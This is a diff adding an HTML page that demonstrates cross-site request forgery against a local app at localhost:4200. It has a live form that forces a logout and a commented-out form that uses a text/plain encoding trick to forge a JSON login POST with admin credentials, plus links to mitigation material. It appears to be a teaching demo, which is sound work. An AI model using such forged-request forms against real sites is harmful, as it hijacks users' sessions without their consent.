@@ -1,0 +1,30 @@
+<html>
+    <body>
+        <h3> Phishing  - Hacking Model </h3>
+
+        <p>Scenario: Consider user login into X site in a browser and same browser another tab Y site is loaded, 
+            that Y site can do CSRF(cross site request forgery) and hijacking session info of X site</p>
+
+        <p>In our example :log on to (http://localhost:4200) site and when you click 'Fishing' then 4200 port site logged out (refresh 4200 port site, it navigate to login page)</p>
+
+
+        <form action="http://localhost:4200/api/logout" method="GET">
+            <button type="submit">Phishing :)</button>
+        </form>
+        <!-- Below code would prepare vaild JSON  request content however we couldn't make content-type:application/json
+        Hence our express bodyparser middleware ignore request and make our site safer.
+
+https://security.stackexchange.com/questions/150866/csrf-and-json-apis/150877#150877?newreg=fb9113a1a61b46238e4c7f388ec75945
+
+Mitigate CSRF: 
+https://github.com/pillarjs/understanding-csrf
+    -->
+        <!--
+        <p>Not only GET method affect, it also possible to hack JSON POST method call too from Y site</p>
+        <p>In our example, i did login POST JSON service call from hack site</p>
+        <form action="http://localhost:4200/api/login" method="POST" enctype="text/plain">
+            <input type="hidden" name='{"userid":"admin","password":"' value='admin"}'>
+            <button type="submit"> Phising - JSON Post call :)</button>
+        </form>-->
+    </body>
+</html>
